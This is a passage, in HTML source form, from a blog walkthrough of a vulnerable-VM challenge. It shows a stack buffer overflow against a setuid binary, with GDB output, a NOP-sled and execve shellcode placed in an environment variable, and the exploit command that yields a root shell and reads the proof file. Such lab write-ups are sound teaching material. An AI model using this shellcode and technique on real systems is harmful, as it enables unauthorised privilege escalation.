</span><span class='line'>0000<span class="p">|</span> 0xbffff610 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">28</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xbffff614 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">24</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff618 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">20</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff61c <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">16</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xbffff620 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">12</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0020<span class="p">|</span> 0xbffff624 <span class="o">(</span><span class="s2">&quot;AAAAAAAA&quot;</span><span class="o">)</span>
</span><span class='line'>0024<span class="p">|</span> 0xbffff628 <span class="o">(</span><span class="s2">&quot;AAAA&quot;</span><span class="o">)</span>
</span><span class='line'>0028<span class="p">|</span> 0xbffff62c --&gt; 0x8048200 --&gt; 0x0
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414141 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Standard buffer overflow process here (I don&rsquo;t want to teach you how to suck eggs tbh, there&rsquo;s enough resources online). EIP is at 269, so&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*268 + &quot;BBBB&quot;&#39;</span><span class="k">)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x110
</span><span class='line'>EBX: 0xb7fbeff4 --&gt; 0x15ed7c
</span><span class='line'>ECX: 0xbffff4f8 --&gt; 0xb7fbf4e0 --&gt; 0xfbad2a84
</span><span class='line'>EDX: 0xb7fc0360 --&gt; 0x0
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xbffff630 --&gt; 0x0
</span><span class='line'>EIP: 0x42424242 <span class="o">(</span><span class="s1">&#39;BBBB&#39;</span><span class="o">)</span>
</span><span class='line'>EFLAGS: 0x10292 <span class="o">(</span>carry parity ADJUST zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x42424242
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff630 --&gt; 0x0
</span><span class='line'>0004<span class="p">|</span> 0xbffff634 --&gt; 0xbffff6d4 --&gt; 0xbffff7f8 <span class="o">(</span><span class="s2">&quot;/root/troll/r00t&quot;</span><span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff638 --&gt; 0xbffff6e0 --&gt; 0xbffff91a <span class="o">(</span><span class="s2">&quot;SHELL=/bin/bash&quot;</span><span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff63c --&gt; 0xb7fe0860 --&gt; 0xb7e60000 --&gt; 0x464c457f
</span><span class='line'>0016<span class="p">|</span> 0xbffff640 --&gt; 0xb7ff6821 <span class="o">(</span>mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">])</span>
</span><span class='line'>0020<span class="p">|</span> 0xbffff644 --&gt; 0xffffffff
</span><span class='line'>0024<span class="p">|</span> 0xbffff648 --&gt; 0xb7ffeff4 --&gt; 0x1cf2c
</span><span class='line'>0028<span class="p">|</span> 0xbffff64c --&gt; 0x8048278 <span class="o">(</span><span class="s2">&quot;__libc_start_main&quot;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x42424242 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>OK, easy peasy. GDB identifies that there isn&rsquo;t a jmp esp in the binary, but it is a dynamically linked binary, so ret2libc is possible. But why make it more complicated for ourselves ? Naaah. Our shellcode can be placed in an environment value</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">SHELLCODE</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90&quot;*100 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#39;</span><span class="k">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which can be located within GDB</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb ./r00t
</span><span class='line'>GNU gdb <span class="o">(</span>Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1<span class="o">)</span> 7.4-2012.04
</span><span class='line'>Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2012</span> Free Software Foundation, Inc.
</span><span class='line'>License GPLv3+: GNU GPL version <span class="m">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
</span><span class='line'>This is free software: you are free to change and redistribute it.
</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type <span class="s2">&quot;show copying&quot;</span>
</span><span class='line'>and <span class="s2">&quot;show warranty&quot;</span> <span class="k">for</span> details.
</span><span class='line'>This GDB was configured as <span class="s2">&quot;i686-linux-gnu&quot;</span>.
</span><span class='line'>For bug reporting instructions, please see:
</span><span class='line'>&lt;http://bugs.launchpad.net/gdb-linaro/&gt;...
</span><span class='line'>Reading symbols from /nothing_to_see_here/choose_wisely/door1/r00t...done.
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break </span>main
</span><span class='line'>Breakpoint <span class="m">1</span> at 0x8048450: file bof.c, line 7.
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run
</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door1/r00t
</span><span class='line'>
</span><span class='line'>Breakpoint 1, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>1, <span class="nv">argv</span><span class="o">=</span>0xbffffcb4<span class="o">)</span> at bof.c:7
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> 7 bof.c: No such file or directory.
</span><span class='line'>x/100xw <span class="nv">$esp</span>
</span><span class='line'>0xbffffb00:   0x00000000  0x00000000  0x00000001  0x000008b0
</span><span class='line'>0xbffffb10:   0x40024b48  0x40024858  0x08048278  0x40037158
</span><span class='line'>0xbffffb20:   0x0804821c  0x00000001  0x400c2230  0x400c245e
</span><span class='line'>0xbffffb30:   0xbffffb68  0x40020ff4  0x40021ad0  0xbffffc54
</span><span class='line'>0xbffffb40:   0xbffffc10  0x40009ed9  0xbffffbf0  0x0804821c
</span><span class='line'>0xbffffb50:   0xbffffbd8  0x40021a74  0x00000000  0x40024b48
</span><span class='line'>0xbffffb60:   0x00000001  0x00000000  0x00000001  0x40021918
</span><span class='line'>0xbffffb70:   0x00000000  0x00000000  0x00000000  0x401cfff4
</span><span class='line'>0xbffffb80:   0xbffffbce  0xbffffbcf  0x00000001  0x400c27b9
</span><span class='line'>0xbffffb90:   0xbffffbcf  0xbffffbce  0x00000000  0x40015fec
</span><span class='line'>0xbffffba0:   0xbffffc54  0x40022000  0x00000000  0x4005cc73
</span><span class='line'>0xbffffbb0:   0x08048278  0x00000000  0x00c10000  0x00000001
</span><span class='line'>0xbffffbc0:   0xbffffdc2  0x0000002f  0xbffffc1c  0x401cfff4
</span><span class='line'>0xbffffbd0:   0x080484b0  0x08049ff4  0x00000001  0x0804831d
</span><span class='line'>0xbffffbe0:   0x401d03e4  0x0000000d  0x08049ff4  0x080484d1
</span><span class='line'>0xbffffbf0:   0xffffffff  0x4005cdc6  0x401cfff4  0x4005ce55
</span><span class='line'>0xbffffc00:   0x4000f280  0x00000000  0x080484b9  0x401cfff4
</span><span class='line'>0xbffffc10:   0x080484b0  0x00000000  0x00000000  0x400434d3
</span><span class='line'>0xbffffc20:   0x00000001  0xbffffcb4  0xbffffcbc  0x40024858
</span><span class='line'>0xbffffc30:   0x00000000  0xbffffc1c  0xbffffcbc  0x00000000
</span><span class='line'>0xbffffc40:   0x0804823c  0x401cfff4  0x00000000  0x00000000
</span><span class='line'>0xbffffc50:   0x00000000  0xdd889bc6  0x2a19fe39  0x00000000
</span><span class='line'>0xbffffc60:   0x00000000  0x00000000  0x00000001  0x08048390
</span><span class='line'>0xbffffc70:   0x00000000  0x400146b0  0x400433e9  0x40020ff4
</span><span class='line'>0xbffffc80:   0x00000001  0x08048390  0x00000000  0x080483b1
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span><span class='line'>0xbffffc90:   0x08048444  0x00000001  0xbffffcb4  0x080484b0
</span><span class='line'>0xbffffca0:   0x08048520  0x4000f280  0xbffffcac  0x40021918
</span><span class='line'>0xbffffcb0:   0x00000001  0xbffffdc2  0x00000000  0xbffffdf0
</span><span class='line'>0xbffffcc0:   0xbffffe77  0xbffffe87  0xbffffea9  0xbffffeb3
</span><span class='line'>0xbffffcd0:   0xbffffebe  0xbffffed2  0xbfffff1f  0xbfffff2e
</span><span class='line'>0xbffffce0:   0xbfffff5b  0xbfffff6c  0xbfffff75  0xbfffff85
</span><span class='line'>0xbffffcf0:   0xbfffff8d  0xbfffff9a  0x00000000  0x00000020
</span><span class='line'>0xbffffd00:   0x40022414  0x00000021  0x40022000  0x00000010
</span><span class='line'>0xbffffd10:   0x0fabfbff  0x00000006  0x00001000  0x00000011
</span><span class='line'>0xbffffd20:   0x00000064  0x00000003  0x08048034  0x00000004
</span><span class='line'>0xbffffd30:   0x00000020  0x00000005  0x00000009  0x00000007
</span><span class='line'>0xbffffd40:   0x40000000  0x00000008  0x00000000  0x00000009
</span><span class='line'>0xbffffd50:   0x08048390  0x0000000b  0x000003ea  0x0000000c
</span><span class='line'>0xbffffd60:   0x000003ea  0x0000000d  0x000003ea  0x0000000e
</span><span class='line'>0xbffffd70:   0x000003ea  0x00000017  0x00000001  0x00000019
</span><span class='line'>0xbffffd80:   0xbffffdab  0x0000001f  0xbfffffce  0x0000000f
</span><span class='line'>0xbffffd90:   0xbffffdbb  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xbffffda0:   0x00000000  0x00000000  0xf6000000  0x6d8240c1
</span><span class='line'>0xbffffdb0:   0xc85c9138  0x1f1bbf89  0x692ef87a  0x00363836
</span><span class='line'>0xbffffdc0:   0x6e2f0000  0x6968746f  0x745f676e  0x65735f6f
</span><span class='line'>0xbffffdd0:   0x65685f65  0x632f6572  0x736f6f68  0x69775f65
</span><span class='line'>0xbffffde0:   0x796c6573  0x6f6f642f  0x722f3172  0x00743030
</span><span class='line'>0xbffffdf0:   0x4c454853  0x444f434c  0x90903d45  0x90909090
</span><span class='line'>0xbffffe00:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xbffffe10:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Shellcode starts around 0xbffffe10, so we just change our EIP to that memory location to run the shellcode. As proven within GDB, it runs as expected and /bin/dash is executed (GDB strips EUID though)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*268 + &quot;\x10\xfe\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door1/r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*268 + &quot;\x10\xfe\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>process <span class="m">1575</span> is executing new program: /bin/dash
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span>
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'><span class="o">[</span>Inferior <span class="m">1</span> <span class="o">(</span>process 1575<span class="o">)</span> exited with code 0177<span class="o">]</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>When run outside of GDB, we get dropped to a root shell</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*268 + &quot;\x10\xfe\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>noob<span class="o">)</span>
</span><span class='line'><span class="nb">cd</span> /root
</span><span class='line'>ls -ls
</span><span class='line'>total 40
</span><span class='line'><span class="m">4</span> -rw-r--r-- <span class="m">1</span> root   root     <span class="m">68</span> Oct  <span class="m">6</span> 18:32 Proof.txt
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">5</span> root   root   <span class="m">4096</span> Oct  <span class="m">4</span> 22:35 core1
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">5</span> root   root   <span class="m">4096</span> Oct  <span class="m">4</span> 22:36 core2
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">5</span> root   root   <span class="m">4096</span> Oct  <span class="m">4</span> 22:36 core3
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">5</span> root   root   <span class="m">4096</span> Oct  <span class="m">4</span> 22:36 core4
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> Oct  <span class="m">5</span> 21:14 goal
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> Oct  <span class="m">6</span> 18:36 hardmode
</span><span class='line'><span class="m">4</span> -rw-r--r-- <span class="m">1</span> maleus maleus <span class="m">1474</span> Oct  <span class="m">4</span> 00:28 lmao.zip
</span><span class='line'><span class="m">4</span> -rw-r--r-- <span class="m">1</span> root   root    <span class="m">828</span> Oct  <span class="m">4</span> 22:43 ran_dir.py
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> Oct  <span class="m">6</span> 18:35 reboot
</span><span class='line'>cat Proof.txt
</span><span class='line'>You win this <span class="nb">time </span>young Jedi...
</span><span class='line'>
</span><span class='line'>a70354f0258dcc00292c72aab3c8b1e4
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://cdn-media-2.lifehack.org/wp-content/files/2014/08/Getting-it-done-gif.gif" alt="" /></p>
</div>


<div class="meta">
	<div class="date">








  


<time datetime="2014-10-26T14:36:45+00:00" pubdate data-updated="true"></time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>


</div>
	
</div>
</article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
		
		
		<a class="addthis_button_tweet"></a>
		
		
		
	</div>
	
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2015

    recrudesce

</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>